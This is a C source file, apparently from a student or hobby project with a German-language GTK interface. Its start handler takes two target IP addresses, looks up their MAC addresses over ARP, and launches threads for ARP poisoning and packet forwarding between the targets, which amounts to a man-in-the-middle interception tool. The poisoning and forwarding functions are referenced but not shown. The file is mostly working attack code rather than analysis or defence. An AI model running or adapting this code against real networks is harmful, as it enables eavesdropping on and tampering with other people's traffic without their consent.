#include "../include/start.h"

// This function gets called, when the start button is clicked

    void
start(GtkWidget *widget, gpointer data) {
    struct DataPass *dataPass = data;
    u_char errbuf[LIBNET_ERRBUF_SIZE];
    libnet_t *l = init_libnet_ethernet(errbuf);
    pcap_t *handle = init_pcap(errbuf);
    uint32_t target1Ip, target2Ip;
    uint8_t *target1_mac = ec_malloc(6);
    uint8_t *target2_mac = ec_malloc(6);

    // Show text in statusTextview

    GtkTextBuffer *buffer;
    GtkTextIter start, end;
    GtkTextIter iter;

    buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(dataPass->chatView));
    gtk_text_buffer_get_iter_at_offset(buffer, &iter, 0);
    gtk_text_buffer_insert(buffer, &iter, "cHAT:\n", -1);


    buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(dataPass->statusView));
    gtk_text_buffer_get_iter_at_offset(buffer, &start, 0);
    gtk_text_buffer_get_iter_at_offset(buffer, &end, 1000);
    gtk_text_buffer_delete(buffer, &start, &end);




    gtk_text_buffer_get_iter_at_offset(buffer, &iter, 0);
    buffer = gtk_text_view_get_buffer(GTK_TEXT_VIEW(dataPass->statusView));
    gtk_text_buffer_insert(buffer, &iter, "wird gestartet ...\n", -1);

    // Convert Targets ASCII-IP's to Numbers
    target1Ip = libnet_name2addr4(l, gtk_entry_get_text(dataPass->ip1Entry),
                                    LIBNET_DONT_RESOLVE);
    target2Ip = libnet_name2addr4(l, gtk_entry_get_text(dataPass->ip2Entry),
                                    LIBNET_DONT_RESOLVE);

    if (target1Ip  ==  -1 && target2Ip == -1)  {
        gtk_entry_set_text (dataPass->ip1Entry, "");
        gtk_entry_set_text (dataPass->ip2Entry, "");
        gtk_entry_set_placeholder_text (dataPass->ip1Entry, "ungültige IP-Adresse");
        gtk_entry_set_placeholder_text (dataPass->ip2Entry, "ungültige IP-Adresse");
        gtk_text_buffer_insert(buffer, &iter, "ungültige IP-Adressen", -1);
        return;
    }                                  
    else if (target1Ip  ==  -1)  {
        gtk_entry_set_text (dataPass->ip1Entry, "");
        gtk_entry_set_placeholder_text (dataPass->ip1Entry, "ungültige IP-Adresse");
        gtk_text_buffer_insert(buffer, &iter, "ungültige IP-Adresse", -1);
        return;
    }
    else if (target2Ip  ==  -1)  {
        gtk_entry_set_placeholder_text (dataPass->ip2Entry, "ungültige IP-Adresse");
        gtk_entry_set_text (dataPass->ip2Entry, "");
        gtk_text_buffer_insert(buffer, &iter, "ungültige IP-Adresse", -1);
        return;
    }

    gtk_text_buffer_insert(buffer, &iter, "erfrage MAC-Adressen ...  ", -1);


    arp_request(target1Ip, l);
    while (arp_receive(handle, target1Ip, target1_mac) != 0) {
        sleep(0.1);   
        arp_request(target1Ip, l);
    }
    
    arp_request(target2Ip, l);
    while (arp_receive(handle, target2Ip, target2_mac) != 0) {
        sleep(0.1);
        arp_request(target2Ip, l);
    }
    gtk_text_buffer_insert(buffer, &iter, "[X]\n", -1);

    dataPass->l = l;
    dataPass->ip1 = target1Ip;
    dataPass->ip2 = target2Ip;
    dataPass->mac1 = target1_mac;
    dataPass->mac2 = target2_mac;
    dataPass->dataSentByUsTo1 = 0;
    dataPass->dataSentByUsTo2 = 0;
    dataPass->header1 = ec_malloc(400);
    dataPass->header2 = ec_malloc(400);
    
    
    
    // Start ARP-Poisoning on different thread 
    g_thread_new("thread", arp_poison, dataPass);
    gtk_text_buffer_insert(buffer, &iter, "ARP-Poisoning gestartet\n", -1);

    // Start ip forwarding on different thread 
    g_thread_new("thread", forward, dataPass);
    gtk_text_buffer_insert(buffer, &iter, "Weiterleiten gestartet\n", -1);
    //pthread_create(&threadForwardId, NULL, forward, (void *)dataPass);

}